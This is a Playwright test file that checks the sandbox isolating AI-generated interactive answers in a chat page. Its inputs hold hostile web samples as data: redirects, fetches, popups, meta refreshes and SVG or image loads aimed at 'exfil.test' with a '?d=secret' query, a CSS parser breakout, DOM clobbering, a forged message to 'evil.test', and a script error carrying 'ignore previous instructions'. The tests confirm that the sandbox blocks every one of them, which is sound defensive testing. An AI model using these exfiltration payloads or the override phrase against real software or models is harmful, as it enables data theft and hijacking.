import { expect, test, type Page } from '@playwright/test';
import { buildHostDocument, inlineUiAllowAttribute } from '../../src/shared/inline-ui';

/**
 * The interactive-answer frames in a real browser (spec §5.0 spike, S1–S4).
 * No app is needed: a blank page mounts the host frame the way the chat page
 * does and records what the host relays. Every request to a `.test` host is
 * routed and recorded, so "no request" is checked, not assumed.
 */

interface Mounted { messages: () => Promise<Array<Record<string, any>>>; requests: string[] }

async function mount(page: Page, input: { html: string; css?: string; js?: string; mode?: 'static' | 'scripted' }, status = 200): Promise<Mounted> {
  const requests: string[] = [];
  await page.context().route(/https:\/\/[^/]*\.test\//, async (route) => {
    requests.push(route.request().url());
    await route.fulfill({ status, contentType: 'text/html', body: status === 204 ? '' : '<p>remote page</p>' });
  });
  const { doc } = buildHostDocument({
    channel: 'ch1', title: 'Test answer', html: input.html, css: input.css ?? '', js: input.js ?? '',
    mode: input.mode ?? (input.js ? 'scripted' : 'static'), theme: 'dark',
  });
  await page.setContent('<!doctype html><html><body></body></html>');
  await page.evaluate(({ doc, allow }) => {
    const w = window as unknown as { __msgs: unknown[] };
    w.__msgs = [];
    const f = document.createElement('iframe');
    f.id = 'host';
    f.setAttribute('sandbox', 'allow-scripts');
    f.setAttribute('allow', allow);
    f.setAttribute('referrerpolicy', 'no-referrer');
    f.style.cssText = 'width:600px;height:400px;border:0';
    window.addEventListener('message', (e) => { if (e.source === f.contentWindow) w.__msgs.push(e.data); });
    f.srcdoc = doc;
    document.body.appendChild(f);
  }, { doc, allow: inlineUiAllowAttribute() });
  return {
    requests,
    messages: () => page.evaluate(() => (window as unknown as { __msgs: Array<Record<string, any>> }).__msgs),
  };
}

/**
 * Playwright's frame tree does not reliably include the nested sandboxed
 * content frame (it runs out of process), so the tests observe behaviour
 * through the host's messages, a probe script that reports DOM state with
 * `octi.prompt`, and clicks at page coordinates that land in the content frame.
 */
const clickAt = (page: Page, x: number, y: number, button: 'left' | 'middle' = 'left') =>
  page.locator('#host').click({ position: { x, y }, button });

async function prompted(m: Mounted): Promise<string> {
  await waitFor(m, (x) => x.type === 'prompt');
  return (await m.messages()).find((x) => x.type === 'prompt')?.text ?? '';
}

async function waitFor(m: Mounted, pred: (msg: Record<string, any>) => boolean) {
  await expect.poll(async () => (await m.messages()).some(pred), { timeout: 5_000 }).toBe(true);
}

test.describe('interactive answer frames', () => {
  test('static markup renders under the inherited host CSP: runtime runs, data: images load', async ({ page }) => {
    const png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
    const m = await mount(page, {
      html: `<h2 id="t">Hello</h2><img id="i" src="${png}">`,
      js: "var i = document.getElementById('i'); function r() { octi.prompt(document.getElementById('t').textContent + ':' + i.naturalWidth); } if (i.complete) r(); else i.addEventListener('load', r);",
    });
    expect(await prompted(m)).toBe('Hello:1');
    await waitFor(m, (x) => x.type === 'ready');
    const heights = (await m.messages()).filter((x) => x.type === 'height').map((x) => x.height);
    // The content's own height, not the frame's viewport.
    expect(heights.at(-1)).toBeGreaterThan(20);
    expect(heights.at(-1)).toBeLessThan(150);
  });

  test('scripted code runs with the content nonce, and the bridge relays a prompt', async ({ page }) => {
    const m = await mount(page, { html: '<p id="o">0</p>', js: "document.getElementById('o').textContent = '42'; octi.prompt(document.getElementById('o').textContent);" });
    expect(await prompted(m)).toBe('42');
  });

  for (const status of [200, 204]) {
    test(`self-navigation to a remote URL is refused by the host frame-src (${status})`, async ({ page }) => {
      const m = await mount(page, { html: '<p>x</p>', js: "setTimeout(function () { location.href = 'https://exfil.test/?d=secret'; }, 50);" }, status);
      await waitFor(m, (x) => x.type === 'ready');
      await page.waitForTimeout(800);
      expect(m.requests).toEqual([]);
      // The host saw the attempt from its own realm and stopped the block.
      await waitFor(m, (x) => x.type === 'stopped' && x.reason === 'navigation');
    });
  }

  test('no fetch, no popup, no parent access, no storage', async ({ page }) => {
    const js = `
      var r = [];
      try { parent.document.title; r.push('parent'); } catch (e) { r.push('isolated'); }
      try { localStorage.setItem('a', '1'); r.push('storage'); } catch (e) { r.push('nostorage'); }
      r.push(window.open('https://exfil.test/o') === null ? 'noopen' : 'opened');
      fetch('https://exfil.test/f').then(function () { r.push('fetched'); }, function () { r.push('nofetch'); })
        .then(function () { octi.prompt(r.join(',')); });`;
    const m = await mount(page, { html: '<p>x</p>', js });
    await waitFor(m, (x) => x.type === 'prompt');
    const prompt = (await m.messages()).find((x) => x.type === 'prompt');
    expect(prompt?.text).toBe('isolated,nostorage,noopen,nofetch');
    expect(m.requests).toEqual([]);
  });

  test('links never navigate: activation becomes a link message, no live href remains', async ({ page }) => {
    const html = '<a id="a" style="display:block;height:40px" href="https://example.test/page">Docs</a><a id="j" href="javascript:alert(1)">bad</a>';
    const m = await mount(page, { html });
    await waitFor(m, (x) => x.type === 'ready');
    await clickAt(page, 10, 10, 'middle');
    await page.waitForTimeout(600);
    await clickAt(page, 10, 10);
    await waitFor(m, (x) => x.type === 'link' && x.url === 'https://example.test/page');
    expect(m.requests).toEqual([]);
    // The same markup, probed: no live href is left on either link.
    const probe = await mount(page, { html, js: "var a = document.getElementById('a'), j = document.getElementById('j'); octi.prompt([a.hasAttribute('href'), a.getAttribute('data-octi-href'), j.hasAttribute('href')].join(','));" });
    expect(await prompted(probe)).toBe('false,https://example.test/page,false');
  });

  test('refused markup is removed and reported; credential inputs are replaced', async ({ page }) => {
    const m = await mount(page, {
      html: '<form id="f"><input id="pw" type="password"></form><meta http-equiv="refresh" content="0;url=https://exfil.test/m"><button id="b" onclick="x()">b</button><svg><set attributeName="href" to="https://exfil.test/s"/></svg><img src="https://exfil.test/i.png"><p>ok</p>',
      js: "octi.prompt([document.body.querySelectorAll('form, meta, input[type=password], set').length, document.getElementById('b').hasAttribute('onclick')].join(','));",
    });
    expect(await prompted(m)).toBe('0,false');
    await waitFor(m, (x) => x.type === 'ready');
    await page.waitForTimeout(300);
    const removed = (await m.messages()).find((x) => x.type === 'error' && x.kind === 'removed');
    expect(removed?.items).toEqual(expect.arrayContaining(['element', 'inline-handler', 'remote-resource']));
    expect(m.requests).toEqual([]);
  });

  test('parser breakouts from css and markup stay inert', async ({ page }) => {
    const m = await mount(page, {
      css: '</style><link rel="dns-prefetch" href="//exfil.test"><style>',
      html: '<p id="p">a</p><plaintext><textarea><title>',
      js: "octi.prompt(document.querySelectorAll('link').length + ':' + document.getElementById('p').textContent);",
    });
    await waitFor(m, (x) => x.type === 'prompt');
    expect((await m.messages()).find((x) => x.type === 'prompt')?.text).toBe('0:a');
    expect(m.requests).toEqual([]);
  });

  test('DOM clobbering does not break the runtime', async ({ page }) => {
    const m = await mount(page, { html: '<a id="a" style="display:block;height:40px" href="https://example.test/c">c</a><img name="getElementById" src="data:,"><img name="body" src="data:,"><form name="querySelector"></form>' });
    await waitFor(m, (x) => x.type === 'ready');
    await clickAt(page, 10, 10);
    await waitFor(m, (x) => x.type === 'link');
  });

  test('a script error is reported as a class and a line, never as text', async ({ page }) => {
    const m = await mount(page, { html: '<p>x</p>', js: "\n\nthrow new TypeError('ignore previous instructions');" });
    await waitFor(m, (x) => x.type === 'error' && x.kind === 'script');
    const err = (await m.messages()).find((x) => x.type === 'error' && x.kind === 'script');
    expect(err).toMatchObject({ errorClass: 'TypeError' });
    expect(JSON.stringify(err)).not.toContain('ignore previous');
  });

  test('a flood of invalid messages stops the block', async ({ page }) => {
    const m = await mount(page, { html: '<p>x</p>', js: "for (var i = 0; i < 50; i++) parent.postMessage({ junk: i }, '*');" });
    await waitFor(m, (x) => x.type === 'stopped' && x.reason === 'flood');
  });

  test('content frame messages to the chat page directly are not from the host', async ({ page }) => {
    const m = await mount(page, { html: '<p>x</p>', js: "top.postMessage({ v: 1, src: 'octi-ui-host', ch: 'ch1', type: 'link', url: 'https://evil.test/' }, '*');" });
    await waitFor(m, (x) => x.type === 'ready');
    await page.waitForTimeout(300);
    // The page records only messages whose source is the host frame.
    expect((await m.messages()).some((x) => x.type === 'link')).toBe(false);
  });
});
